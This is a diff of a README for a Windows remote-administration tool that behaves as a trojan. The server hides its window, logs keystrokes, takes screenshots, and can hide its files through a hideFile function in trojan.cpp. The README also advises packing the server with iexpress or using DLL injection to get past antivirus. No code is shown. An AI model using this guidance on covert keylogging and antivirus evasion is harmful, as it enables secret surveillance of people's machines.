@@ -2,13 +2,13 @@
 > This project is a simple remote-control tool with GUI written by Qt. **It only works for Windows platform**. The project still remains some bugs. One of them is: **TRANSFER BIG FILE (eg. OVER 200MB) MAY CAUSE CRASH IN CLIENT**. If you have any good ideas, please [contact me](mailto:forec@bupt.edu.cn), or open your PR. I feel honored to learn from your help.
 
 ## Platform
-* This project contains two parts. The **SERVER** , which should be executed in remote hosts, is in folder `server`, and the **CLIENT** , is used to control the remote hosts, in folder `client`.
-* The Visual Studio project file `remote.sln` is in the `server` folder. I wrote this project with VS Ultimate 2013, version `12.0.21005.1 REL`.
-* The Visual Studio project file `client.sln` is in the `client` folder. I wrote this project with Qt-windows-x86-msvc2013_64, version `5.6.0`. The Qt Creator is 32bit based on MSVC2013, version `3.6.1`. Some configurations may have relationship with the tool.
+* This project contains two parts. The **SERVER** , which should be executed in remote hosts, is in folder `server`, and the **CLIENT**, is in folder `client`,  used to control the remote hosts.
+* The Visual Studio project file `remote.sln` is in folder `server`. I wrote this project with VS Ultimate 2013, version `12.0.21005.1 REL`.
+* The Visual Studio project file `client.sln` is in folder `client`. I wrote this project with Qt-windows-x86-msvc2013_64, version `5.6.0`. The Qt Creator is 32bits based on MSVC2013, version `3.6.1`. Some configurations may have relationship with the tool.
 
 ## Usage
 ### SERVER
-* Compile: I remove the `remote.sdf` from the repository since it's too big. If you have VS2013 (or higher version), just open `remote.sln`, else please build a new project with other IDEs.
+* Compile: I remove the `remote.sdf` from the repository since it's too large. If you have VS2013 (or higher version), just open `remote.sln`, else please build a new project with other IDEs.
 
 * Assume the program we get after released is `remote.exe`, it's exactly a CMD window, however, I hide the window at the entrance of function `main()`. You can change the first two lines code in function `main()` into comments, then its form will appear. Even it's hidding itself, you can stil find it by `CTRL+ALT+DEL`. I didn't hide the process from taskmgr.
 
@@ -16,9 +16,9 @@
 
 * **Attention**: If you want to use `remote.exe` under **x64** system, I suggest that you should compile it as x64.
 
-* Two files will be created under `E:` in remote hosts, I didn't hide these files. You can use the function provided in `trojan.cpp` which definition is `bool hideFile(const char *path)`. The two files are `E:\key.log` and `E:\screen.tmp`, which will be created by `remote.exe` when client ask for keyboard record or screenshots. **If you want to hide them, remember to use function `hideFile` to hide `E:\screen.tmp` whenever you ask for screenshot.** Since the new screenshot overrides the past screenshot, but the keyboard record is an append operation.
+* Two files will be created under `E:\` in remote hosts, I didn't hide these files. You can use the function provided in `trojan.cpp` which definition is `bool hideFile(const char *path)`. The two files are `E:\key.log` and `E:\screen.tmp`, which will be created by `remote.exe` when client ask for keyboard record or screenshots. **If you want to hide them, remember to use function `hideFile` to hide `E:\screen.tmp` whenever you ask for screenshot.** Since the new screenshot overrides the past screenshot, but the keyboard record is an append operation.
 
-* **TO HIDE**: I didn't do anything protecting `remote.exe`, any common anti-virus software like 360 or Avira can easily kill it. Good news is the Windows Defender doesn't notice this program. To pack the server program, I recommand the `iexpress`, since every Windows system has it as a built-in application, and it's easy, most important. However, **packer is not enough for protect this program from anti-virus software.** Instead of packer, you can also use DLL-Injection( only works for Windows lower than Windows7), which is also provided in this repository. But, **PLEASE LIMIT YOUR ACTION**.
+* **TO HIDE**: I didn't do anything protecting `remote.exe`, any common anti-virus software like 360 or Avira can easily kill it. Good news is the Windows Defender doesn't notice this program. To pack the server program, I recommand the `iexpress`, since every Windows system has it as a built-in application, and it's easy, most important. However, **packer is not enough for protect this program from anti-virus software.** Instead of packer, you can also use DLL-Injection( only works for Windows lower than Windows7), which is also provided in this repository. But, **PLEASE REMEMBER SELF-DISCIPLINE**.
 
 ### CLIENT
 * Compile: I put all files needed in folder `client`, if you have Qt Creator, just open `client.pro`, else please build a new project with other IDEs.
@@ -40,7 +40,7 @@
  * **Get Processes List**: Get all the processes running in remote host, the client will display these information in the `QTextEdit`, which is the widget with `>` in the last picture. That widget cannot be edited, but you can copy its content.
  * **Get ScreenShot**: Get the screenshot of remote host. After receving the screenshot, client will open it automaticly.
  * **Get Keyboard Record**: Get the remote host's keyboard record, records will be displayed in `QTextEdit` too.
- * **Export Logs**: Export your operation history to the selected remote host to a `.log` file.
+ * **Export Logs**: Export your operation history for the selected remote host to a `.log` file.
  * **Delete**: Delete the remote host from your database.
 
 ## Attentions
